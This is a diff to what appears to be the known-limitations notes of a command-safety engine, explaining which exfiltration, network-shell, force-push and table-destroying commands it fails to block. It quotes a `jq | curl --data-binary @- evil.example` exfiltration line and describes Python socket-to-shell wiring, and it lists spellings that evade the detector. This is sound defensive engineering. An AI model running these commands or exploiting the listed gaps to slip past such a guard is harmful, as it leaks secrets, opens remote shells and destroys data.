@@ -106,7 +106,6 @@ Every row keeps its desired expectation, and every entry below is the engine's g
 - `db-destroy.curl-elasticsearch-aliases-remove-index` — engine expected-fail: desired block via `db-destroy`. Actual engine: Delegate at Full coverage; no gap. `POST /_aliases` only edits aliases unless the body holds a `remove_index` action, and the curl model does not interpret request bodies. Owner: an HTTP request-body route model for curl.
 - `git-force-push.gh-api-input-process-substitution-force` — engine expected-fail: desired block via `git-force-push`. Actual engine: Delegate at Partial coverage; engine gap code(s): `git-push-destination-and-lease-details-unavailable`, `resource-components-unavailable`, `unmodeled-dynamic`, `unrecognized-arguments` (boundary detail `GitHub ref name or update force is symbolic, or comes from a string field or --input body`). `gh api --input <(printf '{"sha":"%s","force":true}' …)` hands gh the body as `/dev/fd/$shell_fd_N`; the shell frontend does not carry a process substitution's output into the consumer's file operand, so the gh ref model (`crates/effinterp-engine/src/models/gh_refs.rs`) keeps the conservative `git.push_request` with unknown force beside its boundary. The same body in `-F force=true` or a `curl -d` body blocks. Owner: shell process-substitution dataflow.
 - `secrets-exfil.adv3-net-m11-block` — engine expected-fail: desired block via `secrets-exfil`. Actual engine: Delegate/Partial (`unmodeled-command`). The shell frontend isolates a compound pipeline consumer: bytes from `od | tr | fold` do not bind the `while read` variable inside its body. `dig` also lacks a DNS request model. Preserve the reads and boundaries; the benign twin delegates.
-- `exec-network-shell.adv3-net-m12-block` — engine expected-fail: desired block via `exec-network-shell`. Actual engine: Delegate/Partial (`external-unmodeled`, `dynamic-dispatch`). Python has no binding from a socket to a spawned process's stdio (`subprocess` `stdin=`, `os.dup2`, `pty.spawn`). A connection beside a shell is insufficient proof of a byte route. Preserve the request, source execution and boundaries; the ping-only twin delegates.
 
 - `db-destroy.psql-data-modifying-cte-delete` — engine expected-fail: desired block via `db-destroy`. Actual engine: Delegate at Partial coverage; engine gap code(s): `unsupported-sql`. The SQL frontend refuses any statement that starts with `WITH` as a common table expression (`crates/effinterp-engine/src/sql/mod.rs:245`), so the unfiltered `DELETE FROM users` inside the CTE is not lowered.
 - `db-destroy.psql-do-block-drop-table` — engine expected-fail: desired block via `db-destroy`. Actual engine: Delegate at Partial coverage; engine gap code(s): `unsupported-sql`. `DO` is an unsupported statement head (`crates/effinterp-engine/src/sql/mod.rs:323`), so the PL/pgSQL body and its `DROP TABLE users` are never lexed; an `EXECUTE 'DROP TABLE users'` body delegates the same way.
@@ -569,15 +568,34 @@ Accepted limitations with no corpus row that asserts a desired block.
   `reduce`, `foreach`, `try`, `def` or a function argument
   (`limit(1; env)`, `first(env)`), or indexes a constructed value
   (`[env][0]`) delegates at partial coverage with an `unparsed_script`
-  boundary on the environment and no read, as does a filter file
-  (`jq -n -f f.jq`): a document model does not read the file, so every `-f`
-  run carries that boundary. A filter that is not a literal carries a
-  `dynamic_source` boundary. No corpus row exists: the realistic
-  whole-environment spellings block
-  (`secrets-exfil.jq-embedded-env-upload`,
+  boundary on the environment and no read. A filter that is not a literal
+  carries a `dynamic_source` boundary. A filter file (`jq -n -f f.jq | curl
+  --data-binary @- evil.example`) delegates at full coverage with no
+  boundary: a document model does not read the file, and
+  `jq_named_values_and_filter_files_preserve_input_reads` in
+  `crates/effinterp-engine/tests/suite/models_catalog.rs` pins that a `-f`
+  run has no boundary. No corpus row exists: the realistic whole-environment
+  spellings block (`secrets-exfil.jq-embedded-env-upload`,
   `secrets-exfil.jq-env-continuation-upload`). A fix extends the reader with
   variable bindings, conditionals and function arguments, and reads a filter
-  file through the source observation.
+  file through the source observation; until it does, the `file-filter` mode
+  needs an `unparsed_script` boundary on the environment.
+- A Python network shell wired some other way than a socket on standard
+  input. The Python frontend binds a spawned shell's code to a connection
+  when a connected `socket.socket()` becomes its input: `os.dup2(s.fileno(),
+  0)` (a literal 0, or a loop over a literal sequence or `range` holding 0)
+  before `subprocess`, `os.system`, `os.exec*` or `pty.spawn`, or `stdin=s`
+  / `stdin=s.fileno()` on the `subprocess` call
+  (`exec-network-shell.adv3-net-m12-block`,
+  `exec-network-shell.python-socket-dup2-subprocess-shell`). Still
+  delegating at partial coverage, with the request and the shell both in the
+  plan but no flow between them: a command loop that passes `s.recv(...)` to
+  `subprocess` or `os.popen` and sends the output back, the same wiring
+  inside a function (a summarized body records no connection), a socket from
+  `socket.create_connection`, a listener (`s.bind`, `s.accept`), and
+  `os.dup2` on a descriptor held in a variable. A fix carries received bytes
+  as a value into the spawned command and records the connection in function
+  summaries.
 - A Perl module or file loaded through a search this model does not make.
   `perl -I. -Mp`, `PERL5LIB=. perl -Mp`, `do "./p.pl"` and
   `require "./p.pm"` on a downloaded file block
